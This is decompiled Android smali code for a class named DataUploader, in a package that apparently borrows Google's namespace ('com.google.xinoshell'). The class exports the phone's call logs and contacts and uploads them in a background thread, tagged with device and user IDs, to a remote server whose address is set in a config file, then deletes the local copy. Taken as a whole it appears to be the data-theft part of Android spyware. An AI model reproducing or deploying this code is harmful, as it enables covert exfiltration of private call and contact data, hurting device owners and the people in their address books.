.class public Lcom/google/xinoshell/utils/DataUploader;
.super Ljava/lang/Object;
.source "DataUploader.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/xinoshell/utils/DataUploader$UploadCallback;,
        Lcom/google/xinoshell/utils/DataUploader$UploadResponse;
    }
.end annotation


# static fields
.field private static final TAG:Ljava/lang/String; = "DataUploader"

.field private static final TIMEOUT:I = 0x3a98


# instance fields
.field private final context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 17
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 18
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/utils/DataUploader;->context:Landroid/content/Context;

    .line 19
    return-void
.end method

.method private addFormPart(Ljava/io/PrintWriter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .param p1, "writer"    # Ljava/io/PrintWriter;
    .param p2, "boundary"    # Ljava/lang/String;
    .param p3, "name"    # Ljava/lang/String;
    .param p4, "value"    # Ljava/lang/String;

    .line 160
    const-string v0, "--"

    invoke-virtual {p1, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    const-string v1, "\r\n"

    invoke-virtual {v0, v1}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    .line 161
    const-string v2, "Content-Disposition: form-data; name=\""

    invoke-virtual {v0, v2}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    invoke-virtual {v0, p3}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    const-string v2, "\"\r\n\r\n"

    invoke-virtual {v0, v2}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    .line 162
    invoke-virtual {v0, p4}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/PrintWriter;->flush()V

    .line 163
    return-void
.end method

.method private exportData(Ljava/lang/String;)Ljava/lang/String;
    .locals 1
    .param p1, "dataType"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 86
    const-string v0, "logs"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 87
    iget-object v0, p0, Lcom/google/xinoshell/utils/DataUploader;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/utils/ContactCallLogExporter;->exportCallLogsSync(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    return-object v0

    .line 89
    :cond_0
    iget-object v0, p0, Lcom/google/xinoshell/utils/DataUploader;->context:Landroid/content/Context;

    invoke-static {v0}, Lcom/google/xinoshell/utils/ContactCallLogExporter;->exportContactsSync(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private uploadData(Ljava/lang/String;Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V
    .locals 2
    .param p1, "dataType"    # Ljava/lang/String;
    .param p2, "callback"    # Lcom/google/xinoshell/utils/DataUploader$UploadCallback;

    .line 55
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/google/xinoshell/utils/DataUploader$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0, p1, p2}, Lcom/google/xinoshell/utils/DataUploader$$ExternalSyntheticLambda0;-><init>(Lcom/google/xinoshell/utils/DataUploader;Ljava/lang/String;Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 82
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 83
    return-void
.end method

.method private uploadFile(Ljava/io/File;Ljava/lang/String;)Ljava/lang/String;
    .locals 13
    .param p1, "file"    # Ljava/io/File;
    .param p2, "fileType"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .line 94
    const-string v0, "*****"

    const-string v1, "Failed to delete temp file"

    const-string v2, "DataUploader"

    sget-object v3, Lcom/google/xinoshell/utils/Config;->ServerApiUrl:Ljava/lang/String;

    if-eqz v3, :cond_9

    sget-object v3, Lcom/google/xinoshell/utils/Config;->ServerApiUrl:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_9

    .line 98
    const/4 v3, 0x0

    .line 100
    .local v3, "connection":Ljava/net/HttpURLConnection;
    :try_start_0
    new-instance v4, Ljava/net/URL;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v6, Lcom/google/xinoshell/utils/Config;->ServerApiUrl:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/upload"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v4

    check-cast v4, Ljava/net/HttpURLConnection;

    move-object v3, v4

    .line 101
    const/16 v4, 0x3a98

    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 102
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 103
    const-string v4, "POST"

    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 104
    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 106
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    invoke-virtual {v5, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 107
    .local v0, "boundary":Ljava/lang/String;
    const-string v5, "Content-Type"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "multipart/form-data; boundary="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3, v5, v6}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 109
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_8

    .line 110
    .local v5, "output":Ljava/io/OutputStream;
    :try_start_1
    new-instance v6, Ljava/io/PrintWriter;

    new-instance v7, Ljava/io/OutputStreamWriter;

    const-string v8, "UTF-8"

    invoke-direct {v7, v5, v8}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/lang/String;)V

    invoke-direct {v6, v7, v4}, Ljava/io/PrintWriter;-><init>(Ljava/io/Writer;Z)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_6

    .line 111
    .local v6, "writer":Ljava/io/PrintWriter;
    :try_start_2
    new-instance v4, Ljava/io/FileInputStream;

    invoke-direct {v4, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_4

    .line 113
    .local v4, "input":Ljava/io/InputStream;
    :try_start_3
    const-string v7, "\r\n"

    .line 114
    .local v7, "lineEnd":Ljava/lang/String;
    const-string v8, "--"

    .line 117
    .local v8, "twoHyphens":Ljava/lang/String;
    const-string v9, "deviceId"

    iget-object v10, p0, Lcom/google/xinoshell/utils/DataUploader;->context:Landroid/content/Context;

    invoke-static {v10}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {p0, v6, v0, v9, v10}, Lcom/google/xinoshell/utils/DataUploader;->addFormPart(Ljava/io/PrintWriter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 118
    const-string v9, "userId"

    sget-object v10, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-direct {p0, v6, v0, v9, v10}, Lcom/google/xinoshell/utils/DataUploader;->addFormPart(Ljava/io/PrintWriter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 119
    const-string v9, "fileType"

    invoke-direct {p0, v6, v0, v9, p2}, Lcom/google/xinoshell/utils/DataUploader;->addFormPart(Ljava/io/PrintWriter;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 122
    invoke-virtual {v6, v8}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    invoke-virtual {v9, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    invoke-virtual {v9, v7}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    const-string v10, "Content-Disposition: form-data; name=\"file\"; filename=\""

    .line 123
    invoke-virtual {v9, v10}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    .line 124
    invoke-virtual {p1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    const-string v10, "\""

    invoke-virtual {v9, v10}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    invoke-virtual {v9, v7}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    const-string v10, "Content-Type: application/json"

    .line 125
    invoke-virtual {v9, v10}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    invoke-virtual {v9, v7}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    .line 126
    invoke-virtual {v9, v7}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v9

    invoke-virtual {v9}, Ljava/io/PrintWriter;->flush()V

    .line 129
    const/16 v9, 0x1000

    new-array v9, v9, [B

    .line 131
    .local v9, "buffer":[B
    :goto_0
    invoke-virtual {v4, v9}, Ljava/io/InputStream;->read([B)I

    move-result v10

    move v11, v10

    .local v11, "bytesRead":I
    const/4 v12, -0x1

    if-eq v10, v12, :cond_0

    .line 132
    const/4 v10, 0x0

    invoke-virtual {v5, v9, v10, v11}, Ljava/io/OutputStream;->write([BII)V

    goto :goto_0

    .line 134
    :cond_0
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V

    .line 137
    invoke-virtual {v6, v7}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v10

    invoke-virtual {v10, v8}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v10

    invoke-virtual {v10, v0}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v10

    invoke-virtual {v10, v8}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;

    move-result-object v10

    invoke-virtual {v10, v7}, Ljava/io/PrintWriter;->append(Ljava/lang/CharSequence;)Ljava/io/PrintWriter;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    .line 138
    .end local v7    # "lineEnd":Ljava/lang/String;
    .end local v8    # "twoHyphens":Ljava/lang/String;
    .end local v9    # "buffer":[B
    .end local v11    # "bytesRead":I
    :try_start_4
    invoke-virtual {v4}, Ljava/io/InputStream;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_4

    .end local v4    # "input":Ljava/io/InputStream;
    :try_start_5
    invoke-virtual {v6}, Ljava/io/PrintWriter;->close()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_6

    .end local v6    # "writer":Ljava/io/PrintWriter;
    if-eqz v5, :cond_1

    :try_start_6
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V

    .line 140
    .end local v5    # "output":Ljava/io/OutputStream;
    :cond_1
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v4

    .line 141
    .local v4, "responseCode":I
    const/16 v5, 0xc8

    if-ne v4, v5, :cond_5

    .line 145
    new-instance v5, Ljava/io/BufferedReader;

    new-instance v6, Ljava/io/InputStreamReader;

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v5, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_8

    .line 146
    .local v5, "reader":Ljava/io/BufferedReader;
    :try_start_7
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    .line 148
    .local v6, "response":Ljava/lang/StringBuilder;
    :goto_1
    invoke-virtual {v5}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    move-object v8, v7

    .local v8, "line":Ljava/lang/String;
    if-eqz v7, :cond_2

    .line 149
    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1

    .line 151
    :cond_2
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 152
    :try_start_8
    invoke-virtual {v5}, Ljava/io/BufferedReader;->close()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_8

    .line 154
    if-eqz v3, :cond_3

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 155
    :cond_3
    invoke-virtual {p1}, Ljava/io/File;->delete()Z

    move-result v9

    if-nez v9, :cond_4

    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 151
    :cond_4
    return-object v7

    .line 145
    .end local v6    # "response":Ljava/lang/StringBuilder;
    .end local v8    # "line":Ljava/lang/String;
    :catchall_0
    move-exception v6

    :try_start_9
    invoke-virtual {v5}, Ljava/io/BufferedReader;->close()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_1

    goto :goto_2

    :catchall_1
    move-exception v7

    :try_start_a
    invoke-virtual {v6, v7}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local v3    # "connection":Ljava/net/HttpURLConnection;
    .end local p1    # "file":Ljava/io/File;
    .end local p2    # "fileType":Ljava/lang/String;
    :goto_2
    throw v6

    .line 142
    .end local v5    # "reader":Ljava/io/BufferedReader;
    .restart local v3    # "connection":Ljava/net/HttpURLConnection;
    .restart local p1    # "file":Ljava/io/File;
    .restart local p2    # "fileType":Ljava/lang/String;
    :cond_5
    new-instance v5, Ljava/io/IOException;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Server returned HTTP "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    .end local v3    # "connection":Ljava/net/HttpURLConnection;
    .end local p1    # "file":Ljava/io/File;
    .end local p2    # "fileType":Ljava/lang/String;
    throw v5
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_8

    .line 109
    .restart local v3    # "connection":Ljava/net/HttpURLConnection;
    .local v4, "input":Ljava/io/InputStream;
    .local v5, "output":Ljava/io/OutputStream;
    .local v6, "writer":Ljava/io/PrintWriter;
    .restart local p1    # "file":Ljava/io/File;
    .restart local p2    # "fileType":Ljava/lang/String;
    :catchall_2
    move-exception v7

    :try_start_b
    invoke-virtual {v4}, Ljava/io/InputStream;->close()V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_3

    goto :goto_3

    :catchall_3
    move-exception v8

    :try_start_c
    invoke-virtual {v7, v8}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local v0    # "boundary":Ljava/lang/String;
    .end local v3    # "connection":Ljava/net/HttpURLConnection;
    .end local v5    # "output":Ljava/io/OutputStream;
    .end local v6    # "writer":Ljava/io/PrintWriter;
    .end local p1    # "file":Ljava/io/File;
    .end local p2    # "fileType":Ljava/lang/String;
    :goto_3
    throw v7
    :try_end_c
    .catchall {:try_start_c .. :try_end_c} :catchall_4

    .end local v4    # "input":Ljava/io/InputStream;
    .restart local v0    # "boundary":Ljava/lang/String;
    .restart local v3    # "connection":Ljava/net/HttpURLConnection;
    .restart local v5    # "output":Ljava/io/OutputStream;
    .restart local v6    # "writer":Ljava/io/PrintWriter;
    .restart local p1    # "file":Ljava/io/File;
    .restart local p2    # "fileType":Ljava/lang/String;
    :catchall_4
    move-exception v4

    :try_start_d
    invoke-virtual {v6}, Ljava/io/PrintWriter;->close()V
    :try_end_d
    .catchall {:try_start_d .. :try_end_d} :catchall_5

    goto :goto_4

    :catchall_5
    move-exception v7

    :try_start_e
    invoke-virtual {v4, v7}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local v0    # "boundary":Ljava/lang/String;
    .end local v3    # "connection":Ljava/net/HttpURLConnection;
    .end local v5    # "output":Ljava/io/OutputStream;
    .end local p1    # "file":Ljava/io/File;
    .end local p2    # "fileType":Ljava/lang/String;
    :goto_4
    throw v4
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_6

    .end local v6    # "writer":Ljava/io/PrintWriter;
    .restart local v0    # "boundary":Ljava/lang/String;
    .restart local v3    # "connection":Ljava/net/HttpURLConnection;
    .restart local v5    # "output":Ljava/io/OutputStream;
    .restart local p1    # "file":Ljava/io/File;
    .restart local p2    # "fileType":Ljava/lang/String;
    :catchall_6
    move-exception v4

    if-eqz v5, :cond_6

    :try_start_f
    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V
    :try_end_f
    .catchall {:try_start_f .. :try_end_f} :catchall_7

    goto :goto_5

    :catchall_7
    move-exception v6

    :try_start_10
    invoke-virtual {v4, v6}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local v3    # "connection":Ljava/net/HttpURLConnection;
    .end local p1    # "file":Ljava/io/File;
    .end local p2    # "fileType":Ljava/lang/String;
    :cond_6
    :goto_5
    throw v4
    :try_end_10
    .catchall {:try_start_10 .. :try_end_10} :catchall_8

    .line 154
    .end local v0    # "boundary":Ljava/lang/String;
    .end local v5    # "output":Ljava/io/OutputStream;
    .restart local v3    # "connection":Ljava/net/HttpURLConnection;
    .restart local p1    # "file":Ljava/io/File;
    .restart local p2    # "fileType":Ljava/lang/String;
    :catchall_8
    move-exception v0

    if-eqz v3, :cond_7

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 155
    :cond_7
    invoke-virtual {p1}, Ljava/io/File;->delete()Z

    move-result v4

    if-nez v4, :cond_8

    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 156
    :cond_8
    throw v0

    .line 95
    .end local v3    # "connection":Ljava/net/HttpURLConnection;
    :cond_9
    new-instance v0, Ljava/io/IOException;

    const-string v1, "Server API URL not configured"

    invoke-direct {v0, v1}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v0
.end method


# virtual methods
.method synthetic lambda$uploadData$0$com-google-xinoshell-utils-DataUploader(Ljava/lang/String;Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V
    .locals 12
    .param p1, "dataType"    # Ljava/lang/String;
    .param p2, "callback"    # Lcom/google/xinoshell/utils/DataUploader$UploadCallback;

    .line 57
    :try_start_0
    invoke-direct {p0, p1}, Lcom/google/xinoshell/utils/DataUploader;->exportData(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 58
    .local v0, "filePath":Ljava/lang/String;
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 60
    .local v1, "file":Ljava/io/File;
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 61
    const-string v2, "Exported file not found"

    invoke-interface {p2, v2}, Lcom/google/xinoshell/utils/DataUploader$UploadCallback;->onError(Ljava/lang/String;)V

    .line 62
    return-void

    .line 65
    :cond_0
    invoke-direct {p0, v1, p1}, Lcom/google/xinoshell/utils/DataUploader;->uploadFile(Ljava/io/File;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 66
    .local v2, "response":Ljava/lang/String;
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3, v2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 68
    .local v3, "json":Lorg/json/JSONObject;
    const-string v4, "success"

    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 69
    new-instance v5, Lcom/google/xinoshell/utils/DataUploader$UploadResponse;

    const-string v4, "filename"

    .line 71
    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v4, "path"

    .line 72
    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v4, "size"

    .line 73
    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v9

    const-string v4, "mimetype"

    .line 74
    invoke-virtual {v3, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const/4 v6, 0x1

    invoke-direct/range {v5 .. v11}, Lcom/google/xinoshell/utils/DataUploader$UploadResponse;-><init>(ZLjava/lang/String;Ljava/lang/String;JLjava/lang/String;)V

    .line 69
    invoke-interface {p2, v5}, Lcom/google/xinoshell/utils/DataUploader$UploadCallback;->onSuccess(Lcom/google/xinoshell/utils/DataUploader$UploadResponse;)V

    goto :goto_0

    .line 77
    :cond_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Server error: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "error"

    const-string v6, "Unknown"

    invoke-virtual {v3, v5, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {p2, v4}, Lcom/google/xinoshell/utils/DataUploader$UploadCallback;->onError(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 81
    .end local v0    # "filePath":Ljava/lang/String;
    .end local v1    # "file":Ljava/io/File;
    .end local v2    # "response":Ljava/lang/String;
    .end local v3    # "json":Lorg/json/JSONObject;
    :goto_0
    goto :goto_1

    .line 79
    :catch_0
    move-exception v0

    .line 80
    .local v0, "e":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-interface {p2, v1}, Lcom/google/xinoshell/utils/DataUploader$UploadCallback;->onError(Ljava/lang/String;)V

    .line 82
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_1
    return-void
.end method

.method public uploadCallLogs(Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V
    .locals 1
    .param p1, "callback"    # Lcom/google/xinoshell/utils/DataUploader$UploadCallback;

    .line 47
    const-string v0, "logs"

    invoke-direct {p0, v0, p1}, Lcom/google/xinoshell/utils/DataUploader;->uploadData(Ljava/lang/String;Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V

    .line 48
    return-void
.end method

.method public uploadContacts(Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V
    .locals 1
    .param p1, "callback"    # Lcom/google/xinoshell/utils/DataUploader$UploadCallback;

    .line 51
    const-string v0, "contacts"

    invoke-direct {p0, v0, p1}, Lcom/google/xinoshell/utils/DataUploader;->uploadData(Ljava/lang/String;Lcom/google/xinoshell/utils/DataUploader$UploadCallback;)V

    .line 52
    return-void
.end method
